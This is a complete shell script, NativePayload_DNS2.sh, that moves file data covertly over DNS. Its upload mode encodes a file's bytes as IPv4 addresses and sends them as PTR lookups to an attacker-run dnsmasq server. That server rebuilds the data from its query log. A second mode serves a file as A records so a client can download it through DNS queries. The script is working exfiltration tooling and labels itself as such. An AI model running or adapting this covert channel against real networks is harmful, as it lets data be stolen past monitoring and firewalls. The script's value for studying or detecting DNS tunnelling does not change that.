 #!/bin/sh
echo
echo "NativePayload_DNS2.sh , Published by Damon Mohammadbagher 2017-2018" 
echo "Injecting/Downloading/Uploading DATA to DNS Traffic via DNS A and PTR Records"
echo "help syntax: ./NativePayload_DNS2.sh help"
echo
	if [ $1 == "help" ] 
	then
	tput setaf 2;
	echo
	echo "Example A-Step1: (Server Side ) ./NativePayload_DNS2.sh -r"
	echo "Example A-Step2: (Client Side ) ./NativePayload_DNS2.sh -u text.txt DNSMASQ_IPv4 delay(sec)"
	echo "example IPv4:192.168.56.110 : ./NativePayload_DNS2.sh -r"
	echo "example IPv4:192.168.56.111 : ./NativePayload_DNS2.sh -u text.txt 192.168.56.110 0"
	echo "Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via PTR Queries to DNS server"
	echo
	echo "Example B-Step1: (Server Side ) ./NativePayload_DNS2.sh -d makedns test.txt mydomain.com"
	echo "Example B-Step2: (Client Side ) ./NativePayload_DNS2.sh -d getdata mydomain.com DNSMASQ_IPv4"
	echo "example IPv4:192.168.56.110 : ./NativePayload_DNS2.sh -d makedns text.txt google.com"
	echo "example IPv4:192.168.56.111 : ./NativePayload_DNS2.sh -d getdata google.com 192.168.56.110"
	echo "Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via A record Query"
	echo
	fi

	# uploading data via PTR queries (Client Side "A")
	if [ $1 == "-u" ] 
	then
		c=0		
		octets=""
		tput setaf 9;
			for op in `xxd -p -c 1 $2`; do
			echo "[!] injecting this text via IPv4 octet:" "`echo $op | xxd -r -p`" " ==byte==> " $op " ==dec==> " $((16#$op)).
			octets+=$((16#$op)).			
			((c++))
				if(($c == 4))
				then
				tput setaf 3;
				echo "[!] Your IPv4 is : " "${octets::-1}"
				echo
				tput setaf 9;
				octets=""
				c=0				
				else
				tput setaf 9;
				fi
			done
	echo
	tput setaf 9;
	echo "[!] [Exfil/Uploading DATA] via PTR Record Queries"
	tput setaf 2;
	echo "[!] Sending DNS Lookup by nslookup command"
	tput setaf 2;
	echo "[!] Sending DNS Lookup to DNS Server: " $3
	echo "[!] Sending DNS Lookup by Delay (sec): " $4
	echo
	tput setaf 9;
	tempip=""
	payload=""
	i=0
	Lookupcount=0
		for ops in `xxd -p -c 1 $2`; do
		Exfil=$ops
		temp=`echo $((16#$Exfil)).`
		tempip+=$temp  
		payload+=$tempip
		ipv4=""

			if(($i == 3))
			then
			ipv4+=$tempip
			tput setaf 9;
			echo "[>] [$Lookupcount] Nslookup IPv4 Address: "  "${ipv4::-1}"
			tput setaf 2;
			nslookup "${ipv4::-1}" $3 | grep arpa
			i=0
			tempip=""
			((Lookupcount++))
			sleep $4
			else
			((i++))
			fi

		done
	fi

	# download data via A records queries
	if [ $1 == "-d" ] 
	then

	# Syntax : NativePayload_DNS2.sh -d getdata domain_name DnsMasq_IPv4" (CLIENT SIDE "B")
	if [ $2 == "getdata" ] 
	then	
	PayloadLookups=`nslookup $3  $4 | grep  Add | sort -t. -k 4 -n`
	tput setaf 9;	
	echo "[!] Downloading Mode , Dump Text DATA via DNS A Records "	
	tput setaf 2;	
	echo "[!] Sending DNS A Records Queries for Domain :" $3 "to DNSMASQ-Server:" $4
	echo "[!] to dump test.txt file via A records you should use this syntax in server side:"
	tput setaf 9;
	echo "[!] Syntax : NativePayload_DNS2.sh -d makedns test.txt google.com"
	echo "[>] Dumping this Text via DNS A Record Query:"
	echo
	ARecordscounter=0
		for op in $PayloadLookups; do
		Lookups=`echo $op | cut -d':' -f2`
			if [[ $Lookups != *"#53"* ]]; 
			then
				if [[ $Lookups != *" "* ]]; 
				then
				dec1=`echo $Lookups | cut -d'.' -f1`
				dec2=`echo $Lookups | cut -d'.' -f2`
				dec3=`echo $Lookups | cut -d'.' -f3`
				tput setaf 9;	
				printf '%x'  `echo $dec1 $dec2 $dec3` | xxd -r -p 
		                fi
				((ARecordscounter++))
			fi
		done
		echo
		echo
		tput setaf 2;	
		echo "[!] Dumping Done , Performed by" $((ARecordscounter/2)) "DNS A Records for domain :" $3 "from Server:" $4
		echo


	fi
	# Creating DNS Server and DNSHOST.TXT file (SERVER SIDE "B")
	# NativePayload_DNS2.sh -d makedns google.com
	if [ $2 == "makedns" ] 
	then	

		c=0		
		octets=""
		tput setaf 9;
		echo " " > DnsHost.txt
		SubnetHostIDcounter=0
			for op in `xxd -p -c 1 $3`; do
			echo "[!] injecting this text via IPv4 octet:" "`echo $op | xxd -r -p`" " ==byte==> " $op " ==dec==> " $((16#$op)).
			octets+=$((16#$op)).			
			((c++))
				if(($c == 3))
				then
				tput setaf 3;				
				echo "[!] Your IPv4 is : " "${octets::-1}".$SubnetHostIDcounter
				echo "${octets::-1}".$SubnetHostIDcounter $4 >> DnsHost.txt
				tput setaf 9;
				octets=""
				c=0
				((SubnetHostIDcounter++))				
				else
				tput setaf 9;
				fi
			
			if((SubnetHostIDcounter == 256))
			then
			echo "[!] Oops Your IPv4 HostID was upper than 255 : " "${octets::-1}".$SubnetHostIDcounter
			break
			fi
			done
			echo
			tput setaf 2;
			echo "[!] DnsHost.txt Created by" $SubnetHostIDcounter "A Records for Domain:" $4 
			echo "[!] you can use this DNSHOST.TXT file via Dnsmasq tool"
			tput setaf 2;
			echo "[!] to dump these A records you should use this syntax in client side:"
			tput setaf 9;
			echo "[!] Syntax : NativePayload_DNS2.sh -d getdata domain_name DnsMasq_IPv4"
			echo
			echo "[>] DNSMASQ Satarted by DNSHOST.TXT File"
			echo
			tput setaf 9;
			`dnsmasq --no-hosts --no-daemon --log-queries -H DnsHost.txt`
			tput setaf 9;


	fi

	fi	
	
	# make DNS Server for Dump DATA via DNS PTR Queries (Server Side "A")
	# Reading Mode (log data via dnsmasq log files)
	if [ $1 == "-r" ] 
	then
	tput setaf 9;
	echo "[>] Reading Mode , DNSMASQ Started by this log file : /var/log/dnsmasq.log !" 
	tput setaf 2;
	echo "" > /var/log/dnsmasq.log
	`dnsmasq --no-hosts --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log` &
	filename="/var/log/dnsmasq.log"
	m1=$(md5sum "$filename")
	fs=$(stat -c%s "$filename")
	count=0
	while true; do
		tput setaf 2;		
		sleep 10
		fs2=$(stat -c%s "$filename")
		if [ "$fs" != "$fs2" ] ; 
		then
		
		tput setaf 6;
		echo "[!] /var/log/dnsmasq.log File has changed!" 		
		echo "[!] Checking Queries"
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")
		PTRecords=`cat $filename | grep PTR  | awk {'print $6'}` 		
		echo "[!] Dump this Text via PTR Queries"
		tput setaf 2;
		for ops1 in `echo $PTRecords`; do
		((count++))
                myrecords=`echo $ops1 | cut -d'i' -f1`
		
		mydec1=`echo "${myrecords::-1}" | cut -d'.' -f4`
		mydec2=`echo "${myrecords::-1}" | cut -d'.' -f3`
		mydec3=`echo "${myrecords::-1}" | cut -d'.' -f2`
		mydec4=`echo "${myrecords::-1}" | cut -d'.' -f1`

		tput setaf 9;
		if (($count == 25))
		then
		echo 
		count=0
		else
		printf '%x'  `echo $mydec1 $mydec2 $mydec3 $mydec4` | xxd -r -p 
		tput setaf 2
		fi            
		mydec=""		
		done 
		else
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")
		fi
	done
	fi
